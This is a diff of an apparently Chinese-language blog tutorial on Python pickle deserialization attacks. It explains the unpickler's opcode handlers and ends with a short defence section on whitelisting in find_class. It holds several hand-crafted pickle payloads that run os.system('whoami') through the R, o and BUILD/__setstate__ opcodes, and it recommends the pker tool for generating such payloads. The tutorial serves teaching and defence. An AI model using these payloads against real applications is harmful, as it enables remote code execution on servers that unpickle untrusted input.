+<span class="token comment" spellcheck="true">#\x85将最后一个数据改成元组形式并压到stack栈</span>
 </code></pre>
 <p>payload：</p>
-<pre><code>b&#39;cos\nsystem\nX\x06\x00\x00\x00whoami\x85R.&#39;
+<pre class=" language-text"><code class="language-text">b'cos\nsystem\nX\x06\x00\x00\x00whoami\x85R.'
 </code></pre>
 <ul>
 <li>o操作码</li>
 </ul>
-<pre><code>def load_obj(self):
-    # Stack is ... markobject classobject arg1 arg2 ...
-    args = self.pop_mark()
-    cls = args.pop(0)
-    self._instantiate执行(cls, args)
-dispatch[OBJ[0]] = load_obj
-#弹栈，将函数和参数交给_instantiate执行
+<pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">load_obj</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token comment" spellcheck="true"># Stack is ... markobject classobject arg1 arg2 ...</span>
+    args <span class="token operator">=</span> self<span class="token punctuation">.</span>pop_mark<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    cls <span class="token operator">=</span> args<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+    self<span class="token punctuation">.</span>_instantiate执行<span class="token punctuation">(</span>cls<span class="token punctuation">,</span> args<span class="token punctuation">)</span>
+dispatch<span class="token punctuation">[</span>OBJ<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> load_obj
+<span class="token comment" spellcheck="true">#弹栈，将函数和参数交给_instantiate执行</span>
 </code></pre>
 <p>payload:</p>
-<pre><code>b&#39;(cos\nsystem\nX\x06\x00\x00\x00whoamio.&#39;
+<pre class=" language-text"><code class="language-text">b'(cos\nsystem\nX\x06\x00\x00\x00whoamio.'
 </code></pre>
 <ul>
 <li>b</li>
 </ul>
-<pre><code>def load_build(self):
-    stack = self.stack
-    state = stack.pop()
-    inst = stack[-1]
-    setstate = getattr(inst, &quot;__setstate__&quot;, None)
-    if setstate is not None:
-        setstate(state)
-        return
-    slotstate = None
-    if isinstance(state, tuple) and len(state) == 2:
-        state, slotstate = state
-    if state:
-        inst_dict = inst.__dict__
-        intern = sys.intern
-        for k, v in state.items():
-            if type(k) is str:
-                inst_dict[intern(k)] = v
-            else:
-                inst_dict[k] = v
-    if slotstate:
-            for k, v in slotstate.items():
-                setattr(inst, k, v)
-dispatch[BUILD[0]] = load_build
-#上面实例分析有，不在复述
+<pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">load_build</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    stack <span class="token operator">=</span> self<span class="token punctuation">.</span>stack
+    state <span class="token operator">=</span> stack<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    inst <span class="token operator">=</span> stack<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
+    setstate <span class="token operator">=</span> getattr<span class="token punctuation">(</span>inst<span class="token punctuation">,</span> <span class="token string">"__setstate__"</span><span class="token punctuation">,</span> None<span class="token punctuation">)</span>
+    <span class="token keyword">if</span> setstate <span class="token keyword">is</span> <span class="token operator">not</span> None<span class="token punctuation">:</span>
+        setstate<span class="token punctuation">(</span>state<span class="token punctuation">)</span>
+        <span class="token keyword">return</span>
+    slotstate <span class="token operator">=</span> None
+    <span class="token keyword">if</span> isinstance<span class="token punctuation">(</span>state<span class="token punctuation">,</span> tuple<span class="token punctuation">)</span> <span class="token operator">and</span> len<span class="token punctuation">(</span>state<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">:</span>
+        state<span class="token punctuation">,</span> slotstate <span class="token operator">=</span> state
+    <span class="token keyword">if</span> state<span class="token punctuation">:</span>
+        inst_dict <span class="token operator">=</span> inst<span class="token punctuation">.</span>__dict__
+        intern <span class="token operator">=</span> sys<span class="token punctuation">.</span>intern
+        <span class="token keyword">for</span> k<span class="token punctuation">,</span> v <span class="token keyword">in</span> state<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            <span class="token keyword">if</span> type<span class="token punctuation">(</span>k<span class="token punctuation">)</span> <span class="token keyword">is</span> str<span class="token punctuation">:</span>
+                inst_dict<span class="token punctuation">[</span>intern<span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> v
+            <span class="token keyword">else</span><span class="token punctuation">:</span>
+                inst_dict<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">=</span> v
+    <span class="token keyword">if</span> slotstate<span class="token punctuation">:</span>
+            <span class="token keyword">for</span> k<span class="token punctuation">,</span> v <span class="token keyword">in</span> slotstate<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+                setattr<span class="token punctuation">(</span>inst<span class="token punctuation">,</span> k<span class="token punctuation">,</span> v<span class="token punctuation">)</span>
+dispatch<span class="token punctuation">[</span>BUILD<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> load_build
+<span class="token comment" spellcheck="true">#上面实例分析有，不在复述</span>
 </code></pre>
 <ul>
 <li>payload</li>
 </ul>
-<pre><code>class lees:
+<pre class=" language-text"><code class="language-text">class lees:
     pass
 
-b&#39;\x80\x03c__main__\lees\n)\x81&#125;X\x0C\x00\x00\x00__setstate__cos\nsystem\nsbX\x06\x00\x00\x00whoamib.&#39;
+b'\x80\x03c__main__\lees\n)\x81&#125;X\x0C\x00\x00\x00__setstate__cos\nsystem\nsbX\x06\x00\x00\x00whoamib.'
 </code></pre>
 <h2 id="pker工具"><a href="#pker工具" class="headerlink" title="pker工具"></a><a target="_blank" rel="noopener" href="https://github.com/eddieivan01/pker">pker工具</a></h2><p>pker工具可以仿python产生pickle opcode，当让还是建议手撸，pker辅助。</p>
 <h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p>为了解决pickle反序列化的问题，官方给的方法是重写<code>Unpickler.find_class()</code>加入白名单来解决，并且给出警告：对于允许反序列化的对象必须要保持警惕。对于开发者而言，如果实在要给用户反序列化的权限，最好使用双白名单限制<code>module</code>和<code>name</code>并充分考虑到白名单中的各模块和各函数是否有危险。</p>
@@ -1184,7 +1184,7 @@ b&#39;\x80\x03c__main__\lees\n)\x81&#125;X\x0C\x00\x00\x00__setstate__cos\nsyste
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">19.7k</span>
+                        class="white-color">21.6k</span>
             
             
             
